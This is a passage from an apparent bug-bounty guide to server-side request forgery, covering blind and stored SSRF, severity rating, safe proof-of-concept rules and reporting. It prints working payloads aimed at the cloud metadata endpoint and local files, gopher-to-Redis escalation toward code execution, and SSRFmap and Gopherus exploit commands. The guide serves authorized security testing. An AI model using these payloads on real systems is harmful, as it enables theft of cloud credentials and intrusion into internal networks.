file:///C:/Windows/win.ini  file:///C:/inetpub/wwwroot/web.config   (Windows)
```
Also `file://` via the PDF/headless path (§16) and via XXE (FileUpload guide §14).
> Prove with a **non-sensitive** file (`/etc/hostname`, `/etc/passwd` is the conventional benign proof) — don't exfiltrate real secrets/keys beyond what's needed to show the read works (§23).

---

# 15. Blind SSRF — Confirmation & Escalation

No visible response — but blind SSRF is still High–Critical if you escalate it.
```
□ CONFIRM:  OOB callback (DNS+HTTP) with server source IP (§4). DNS-only hit still confirms server-side resolution.
□ MAP (oracle): even blind, use TIMING (open port responds slow/fast vs closed) and STATUS/ERROR differences to
   port-scan and host-discover internally (§12) — you "see" via side channels.
□ EXFIL the blind response: if you can't read it directly, make the SERVER send it OUT:
   - redirect the internal response into your OOB (some setups), or
   - XXE-style OOB DTD if it's a parser (FileUpload §14), or
   - gopher to a service that emails/posts data to you.
□ ACT without reading: blind is enough for STATE CHANGE — gopher POST to an internal API, Redis write→RCE (§13),
   metadata fetch where the creds are then used by a follow-on feature.
□ Metadata via blind: chain redirect (§8) so the blind fetch lands on metadata and the response is reflected somewhere
   you CAN see (an error, a stored field, a generated PDF, §16/§17).
```
> Blind SSRF that you escalate to an internal port scan + a confirmed internal service hit is **High**; blind that reaches metadata or achieves a gopher write is **Critical**. Blind that can only reach *external* hosts is **Low** (§20).

---

# 16. SSRF in Specific Features

## 16.1 PDF / HTML→image generators (headless Chrome / wkhtmltopdf)
You control HTML/URL that the server renders. Inject resources that fetch internal/`file://`:
```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<img src="file:///etc/passwd">
<script>fetch('http://127.0.0.1:6379').then(...)</script>     <!-- headless Chrome executes JS -->
<link rel=attachment href="file:///etc/passwd">               <!-- wkhtmltopdf file read -->
```
The fetched content appears **in the generated PDF/image** → in-band SSRF + **local file read**. Very high yield; test every "export/print/screenshot" feature.

## 16.2 Image proxy / thumbnailer
`/proxy?url=` or remote-image features fetch your URL server-side. Point at internal/metadata; the proxied image (or its error/size) leaks reachability. Some return the raw bytes → in-band.

## 16.3 Webhooks
You set a webhook URL; the server POSTs to it. Point it internal/metadata. Often **blind** → escalate via §15. Webhook **POST** bodies can sometimes be steered to internal state-changing endpoints.

## 16.4 SVG / XXE → SSRF
Uploaded/parsed SVG/XML with external entities makes the parser fetch a URL → SSRF (cross-ref FileUpload guide §14). `<image xlink:href="http://169.254.169.254/...">`.

## 16.5 SSO / OIDC / SAML
`openid-configuration`/`jwks_uri`/SAML-metadata URLs the server fetches → SSRF (cross-ref JWT guide §11 `jku`).

> **If this → then that:** any **PDF/screenshot** feature → test `<iframe>`/`<img file://>` for **in-band metadata + file read** in one shot — among the highest-impact, most reliable SSRF on the web.

---

# 17. Second-Order / Stored SSRF

The URL you supply isn't fetched immediately — it's **stored** and fetched later by a backend job (avatar re-fetch, scheduled webhook, report generator, link checker, cache warmer).
```
□ Set a profile/webhook/feed URL to your OOB host → wait → a delayed callback from a DIFFERENT (backend) IP = stored SSRF.
□ The backend often has MORE internal access than the web tier → higher impact.
□ Use unique markers per field so the delayed callback tells you WHICH input fired (like blind XSS, XSS guide §13).
```
> Stored SSRF lands in **back-office/worker** infrastructure that's frequently less firewalled and holds broader cloud permissions — so it often **out-impacts** the front-end SSRF. Plant markers widely and watch for delayed callbacks.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 18. The Escalation Mindset

A triager's first question is **"what did the SSRF actually reach?"** Answer, in descending value:
```
1. Cloud metadata → live IAM creds / k8s SA token → cloud/cluster takeover     → Critical
2. gopher/dict → internal service (Redis/FastCGI/DB) → RCE                       → Critical
3. Internal HTTP read of unauth admin/data services (in-band)                    → High–Critical
4. Local file read (file://) of secrets/config                                   → High
5. Internal port scan / host discovery / blind internal reach                    → Medium–High
6. External-only fetch (the feature is meant to fetch external) / blind external → Low–Info
```
Climb as high as the reachability allows and **demonstrate it**. The callback is the door; the report is the metadata creds / internal RCE behind it.

---

# 19. The Validity-First Mindset

## 19.1 The four questions a triager asks (answer them in your report)
1. **Does the SERVER make the request, and where does it reach?** Source IP = server/cloud, and you reached internal/metadata — not just "external URL fetched".
2. **What concrete impact?** Creds retrieved, internal service read/changed, file read, RCE. Name it.
3. **What does the attacker need?** Often just an authenticated (sometimes unauth) request to the feature → low bar = higher severity.
4. **Reproducible & in scope?** The exact request, the bypass, and the response/callback proving reach.

## 19.2 The "callback vs reach" rule (most important)
| You have | Standalone verdict | Becomes valuable when… |
|---|---|---|
| OOB callback from the server | Confirmation only | …you reach **internal/metadata**, not just your own host (§11/§12). |
| Can fetch arbitrary **external** URLs | Low/Info (if feature is meant to) | …it bypasses an IP-allowlist for abuse, or you pivot internal. |
| Reached `127.0.0.1`/internal, blind | Medium | …you read internal data (in-band) or act (gopher) (§12/§13). |
| Reached metadata endpoint | High | …you actually **retrieve live creds** and prove them (`sts get-caller-identity`) (§11). |
| `file://` works | High | …you read a real secret/config (prove with a benign file) (§14). |
| gopher to internal service | High | …you execute a command / achieve RCE (§13). |

## 19.3 Production-scope discipline
Confirm on the **production** host/cloud (metadata creds are environment-specific). Re-test after partial fixes — blocking the literal metadata IP but not its **decimal** form, or validating the first URL but **following redirects**, is a fresh valid finding.

---

# 20. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **"The server fetched my Collaborator"** (external only) | Confirmation, not impact — esp. if the feature *is* meant to fetch external URLs. | You reach **internal/metadata** or use it to bypass an IP-allowlist meaningfully (§11/§12). |
| 2 | **Client-side fetch** (request came from YOUR IP) | Not server-side; maybe a redirect, not SSRF. | The request originates from the **server/cloud** IP (§4). |
| 3 | **Blind SSRF, external-only, no internal reach** | Low impact alone. | Escalate to internal/metadata/oracle (§15); else Low. |
| 4 | **Metadata IP "reachable" but IMDSv2 blocks creds, no header control** | If you can't get the token, you can't get creds → no cred impact. | You retrieve creds (IMDSv1, or header control / gopher for v2) (§11). |
| 5 | **DoS by making the server fetch huge files / many requests** | Often out of scope; not SSRF impact. | Only where DoS is in scope and demonstrated safely. |
| 6 | **Fetching a URL the app is designed to fetch** (a normal integration) | Intended behavior. | It can be pointed **internal**, not just to intended external hosts. |
| 7 | **"Open redirect" reported as SSRF** | A client redirect isn't a server-side fetch. | The redirect is **followed by the server** to reach internal (§8). |
| 8 | **Self-SSRF to your own external server with no internal pivot** | No internal/cloud reach = no real impact. | Pivot internal or retrieve metadata. |
| 9 | **Reached internal host but couldn't read/do anything** | Reachability without a usable response/action. | In-band read (§12), oracle mapping, or gopher action (§13). |

> Rule of thumb: if you can't say *"the server reached `<internal/metadata>` and I obtained `<creds/data/RCE>`,"* you have a **confirmed SSRF without demonstrated impact** — which is often Low. Keep escalating (bypass the filter, reach metadata, try gopher) before reporting.

---

# 21. Severity Calibration — how triagers really rate SSRF

| Scenario | Typical alone | Realistic chained | What moves it |
|---|---|---|---|
| **SSRF → cloud metadata → live IAM creds** | **Critical** | Critical | Creds proven (`sts get-caller-identity`) = cloud takeover. |
| **SSRF (gopher) → internal Redis/FastCGI/DB → RCE** | **Critical** | Critical | Command execution on internal infra. |
| **In-band SSRF reading internal unauth services/data** | **High** | Critical | Sensitive internal data / admin actions. |
| **`file://` local file read of secrets** | **High** | Critical | Reads creds/keys → pivot. |
| **Stored/second-order SSRF into a backend** | **High–Critical** | Critical | Backend has broader access. |
| **Blind SSRF + internal port scan/host discovery** | **Medium–High** | High | Maps internal; sets up further attack. |
| **Internal reach, no usable read/action** | **Medium** | — | Up if you find a readable/actionable service. |
| **External-only / blind-external SSRF** | **Low–Info** | — | Don't lead with it. |
| **SSRF used to bypass an IP allowlist (e.g., hit a partner API)** | **Medium** | — | Context-dependent abuse. |

**CVSS / CWE:**
- Metadata-creds SSRF: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` → Critical (~9.x). **CWE-918**.
- Internal read: scope-changed, `C:H` → High.
- Anchor to **CWE-918** (SSRF); add the outcome (CWE-200 info-exposure, or RCE chains) where relevant.

---

# 22. Impact-Escalation Playbooks — "you found X, now do Y"

### 22.1 You found: *a Collaborator hit (baseline SSRF)*
- **Escalate:** map reachability (§5). Try `127.0.0.1`, internal ranges, and **`169.254.169.254`** (and its decimal/hex forms §6). If blocked → Part II bypasses.
- **Evidence:** an OOB hit from the **server IP** to an **internal/metadata** target, or in-band internal content.
- **Severity:** Low (external) → High–Critical (internal/metadata).

### 22.2 You found: *metadata IP is reachable*
- **Escalate:** AWS IMDSv1 → list role → fetch creds (§11.1). Run `aws sts get-caller-identity` to prove live. GCP/Azure → fetch token (need the header → header-control sink or gopher).
- **Evidence:** the creds/token + `get-caller-identity` output (read-only).
- **Severity:** **Critical**.

### 22.3 You found: *an SSRF filter blocks internal*
- **Escalate:** IP obfuscation (decimal/hex/IPv6, §6) → DNS rebinding (§7) → redirect-to-internal (§8, `poc/redirect_server.py`) → parser-confusion `@`/`#` (§9). One usually lands.
- **Evidence:** internal/metadata reached despite the filter.
- **Severity:** restores High–Critical.

### 22.4 You found: *gopher:// is accepted + an internal service*
- **Escalate:** Gopherus/`poc/gopher_redis.py` → talk to Redis/FastCGI/MySQL. Prove control benignly (SET a marker), then (authorized) cron/SSH/web-shell → RCE (§13).
- **Evidence:** a benign Redis key you set & read back; or the RCE marker.
- **Severity:** **Critical**.

### 22.5 You found: *a PDF/screenshot generator*
- **Escalate:** inject `<iframe src=http://169.254.169.254/...>` and `<img src=file:///etc/passwd>` → the metadata/file content renders **into the PDF** (in-band, §16.1).
- **Evidence:** the generated PDF showing metadata/file contents.
- **Severity:** **High–Critical** (metadata creds + file read).

### 22.6 You found: *blind SSRF only*
- **Escalate:** timing/status oracle → internal port scan (§12); redirect blind fetch into metadata and reflect the response somewhere visible (stored field/error/PDF, §15/§17); gopher state-change without reading.
- **Evidence:** oracle-mapped internal ports + a confirmed internal service, or a reflected metadata response.
- **Severity:** Medium → Critical depending on escalation.

### 22.7 You found: *`file://` works*
- **Escalate:** read `/etc/passwd` (proof), then a real secret path (`/proc/self/environ`, k8s SA token, `.aws/credentials`) — minimally, to show secret exposure (§14).
- **Evidence:** file contents (benign first; minimal secret proof).
- **Severity:** **High** (Critical if it yields creds → pivot).

---

# 23. Building a Professional, Safe PoC

A great SSRF PoC is **unambiguous, reproducible, and minimally invasive.**
```
DO:
  □ Confirm with an OOB callback that shows the SERVER/cloud source IP.
  □ For metadata: retrieve the creds, then prove them LIVE with read-only `aws sts get-caller-identity`
    (or GCP/Azure token introspection). STOP there — that's a complete Critical PoC.
  □ For file read: prove with /etc/hostname or /etc/passwd; minimal secret read only if needed to show impact.
  □ For gopher/internal: prove control with a BENIGN command (SET a marker key, INFO, a no-op) first.
  □ For port scan: read-only mapping; don't hammer.
  □ Capture: the exact request, the bypass used, and the response/callback proving reach.
DON'T:
  □ Use stolen IAM creds to enumerate/read/modify REAL data (get-caller-identity is enough).
  □ Run destructive internal commands, write cron/SSH on prod without explicit authorization, or leave artifacts.
  □ DoS the internal network or the metadata service.
  □ Exfiltrate real secrets beyond the minimum to demonstrate the read.
```
> The single most important restraint: **with metadata creds, prove `get-caller-identity` and stop.** Listing/reading real S3/cloud resources is unnecessary for a Critical and crosses into unauthorized access. Same discipline as the FileUpload guide's benign markers.

**Remediation to include:** allowlist destinations (not denylist); resolve the host and **validate the IP is public before AND at fetch time** (defeat rebinding by pinning the resolved IP); block link-local/loopback/internal ranges and the metadata IP (all encodings); disable unused schemes (`file`/`gopher`/`dict`); don't follow redirects to internal; enforce **IMDSv2** + hop-limit; isolate the fetcher (egress firewall / no cloud role); strip response back to the user.

---

# 24. Reporting, CWE/CVSS & De-duplication

Use `SSRF_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "SSRF in <feature> → AWS IMDS → IAM credential theft (cloud account compromise)"  (name the IMPACT)
2. Severity     CVSS 3.1 vector + score + CWE-918 (+ outcome CWE)
3. Asset        exact endpoint/param/feature + the bypass used + observability class
4. Summary      where the fetch happens, how you steered it internal, what you reached
5. Steps        numbered: the request, the bypass, the response/callback proving reach
6. PoC          the exact payload + the OOB/in-band evidence (creds + get-caller-identity, file contents, gopher proof)
7. Impact       metadata creds / internal RCE / file read — the "so what"
8. Remediation  allowlist + IP-pin + block internal/metadata + disable schemes + IMDSv2 (§23)
```
**De-dup:** one root cause (an unvalidated fetch sink) = one finding even if reachable via several params; lead with the highest-impact reach. Don't split "SSRF confirmed" and "metadata creds" — they're one report.

---

# 25. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
# Inject your OOB host everywhere (headers + params) to surface hidden SSRF:
#   Burp "Collaborator Everywhere" BApp — passive, catches SSRF in Referer/X-Forwarded-* etc.
# Param-level:
cat urls.txt | qsreplace 'http://YOUR.oast.fun' | httpx -silent   # watch interactsh for hits
nuclei -l live.txt -tags ssrf -o ssrf.txt
# Exploitation frameworks:
python3 SSRFmap/ssrfmap.py -r request.txt -p url -m readfiles,portscan,redis,aws    # automates bypass+modules
python3 Gopherus/gopherus.py --exploit redis                                          # gopher payloads
```
- **Quality gate:** never submit "tool got a callback." Reproduce the **internal/metadata reach** by hand, retrieve the **concrete impact** (creds/file/RCE), and prove it safely (§23).

**Red-team angles:**
```
□ SSRF → metadata creds → assume the role → pivot across the cloud account (read-only mapping for the report).
□ Stored/second-order SSRF into worker/back-office tiers (broader cloud perms, less firewalling) (§17).
□ gopher → internal CI (Jenkins)/registry/k8s API → supply-chain / cluster compromise.
□ Chain: SSRF + open redirect (own domain) to pass same-origin allowlists; SSRF + XXE for file read; SSRF + request smuggling.
□ Use SSRF as the network-pivot from an external web app into the internal estate (the classic perimeter break).
```

---

# Appendix A — SSRF Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                        SSRF WORKFLOW                               │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: find EVERY url-fetch sink (webhook/preview/import/PDF/    │
│    image-proxy/SSO/headers/file-parser) §3 · OOB + redirect server  │
│ 1. BASELINE ★ : point sink at YOUR oob host →                      │
│    • server source IP? (=SSRF)  • in-band / semi-blind / blind? §4  │
│ 2. REACHABILITY: external → 127.0.0.1 → internal → 169.254.169.254 §5│
│ 3. FILTER BYPASS (to reach internal/metadata):                     │
│    IP obfusc (decimal/hex/IPv6) §6 · DNS rebind §7 · redirect §8 ·  │
│    parser @/#/\ §9 · protocols gopher/file/dict §10                 │
│ 4. IMPACT ⭐ (route by reach):                                      │
│    metadata → IAM creds (sts get-caller-identity) .... §11  ⭐⭐⭐    │
│    gopher → Redis/FastCGI/DB → RCE ................... §13  ⭐⭐      │
│    in-band internal read / port scan ................ §12  ⭐        │
│    file:// local file read .......................... §14          │
│    PDF/headless: <iframe metadata>+<img file://> .... §16          │
│    blind → oracle scan / redirect-exfil / gopher .... §15          │
│    stored/second-order into backend ................. §17          │
│ 5. VALIDATE → REPORT:                                              │
│    false-positive filter §20 · CVSS+CWE-918 §21                    │
│    SAFE PoC: get-caller-identity & STOP, benign gopher §23         │
│    title = IMPACT (creds/RCE/file), dedup §24                      │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — SSRF Attack Decision Tree

```
Pointed the sink at my OOB host (§4) →
│
├─ Callback from MY IP? → client-side, not SSRF. (open redirect at most.) Stop or find a server-side sink.
├─ Callback from SERVER/cloud IP? → SSRF confirmed. Note in-band / semi-blind / blind.
│
├─ Can I reach 169.254.169.254 (or decimal 2852039166)? 
│     └─ YES → AWS IMDSv1 creds (§11.1). v2-only + no header control? → gopher raw PUT+GET (§13) or note limitation.
│            GCP/Azure need a header → header-control sink or gopher. → CRITICAL (creds).
│
├─ Internal reachable but metadata blocked?
│     ├─ in-band → read internal services (ES/admin/actuator), port scan (§12).
│     └─ gopher accepted + internal service (Redis/FastCGI/DB)? → RCE (§13). CRITICAL.
│
├─ Internal BLOCKED by a filter?
│     └─ bypass: IP obfuscation §6 → DNS rebinding §7 → redirect-to-internal §8 → parser @/# §9. Re-test reach.
│
├─ file:// accepted? → local file read (secrets/config/k8s token) §14.
│
├─ A PDF/screenshot/headless feature? → <iframe metadata> + <img file://> → in-band creds+file read §16.1.
│
├─ Only BLIND? → timing/status oracle port-scan §12 · redirect-exfil metadata into a visible field §15 · gopher state-change.
│
└─ Only EXTERNAL reach, feature meant to fetch external? → Low/Info (§20). Try harder to pivot internal before reporting.

ALWAYS: prove impact (creds via get-caller-identity / file contents / benign gopher), then STOP and report (§23).
```

---

# Appendix C — References & Further Reading

**Always-on (start here):**
- **PortSwigger Web Security Academy — SSRF** (topic + labs): https://portswigger.net/web-security/ssrf
- **HackTricks — SSRF (Server Side Request Forgery):** https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- **PayloadsAllTheThings — Server Side Request Forgery:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- **OWASP** — SSRF Prevention Cheat Sheet · **WSTG** Testing for SSRF: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **PentesterLab** — SSRF / cloud-metadata exercises

**Class research (SSRF is a research-driven class — read the primaries):**
- **Orange Tsai — "A New Era of SSRF: Exploiting URL Parsers"** (Black Hat USA 2017) — the seminal URL-parser-confusion / protocol-smuggling research: https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html
- **Rhino Security Labs — SSRF → AWS IMDS → IAM credentials** (the Capital One breach pattern, 2019): https://rhinosecuritylabs.com/aws/
- **DNS rebinding** (rbndr / 1u.ms / nip.io / sslip.io): https://lock.cmpxchg8b.com/rebinder.html

**Tools:**
- **SSRFmap** (automated exploitation): https://github.com/swisskyrepo/SSRFmap · **Gopherus** (gopher→RCE payloads): https://github.com/tarunkant/Gopherus · **interactsh** / Burp Collaborator (OOB): https://github.com/projectdiscovery/interactsh · the `poc/` helpers here.

**Reference docs:**
- **AWS IMDSv2 / cloud metadata retrieval** (the `PUT`-token flow that changes the technique): https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html

**Standards & scoring:**
- **CWE-918** (Server-Side Request Forgery): https://cwe.mitre.org/data/definitions/918.html · related **CWE-611** (XXE→SSRF) · **CWE-441** (confused deputy)
- **CVSS 3.1** — external-only SSRF is often Low, but SSRF→metadata→IAM/RCE is `C:H/I:H/A:H` (often `S:C`) = Critical (see §21).

**Notable real-world case:**
- **Capital One breach (2019)** — WAF SSRF → EC2 IMDSv1 → IAM role creds → S3 dump of 100M+ records. The canonical "SSRF is Critical" case.

---

> **Final reminder — the one rule that pays:** *An SSRF is only a finding when the server reaches somewhere it shouldn't and you obtain something real there — IAM creds, internal data, RCE, or a sensitive file.* Confirm with the callback, steer the request inward past the filter, climb to the highest reach the app allows, and prove it safely (`get-caller-identity` and stop). That's how a webhook field becomes the Critical it's worth.
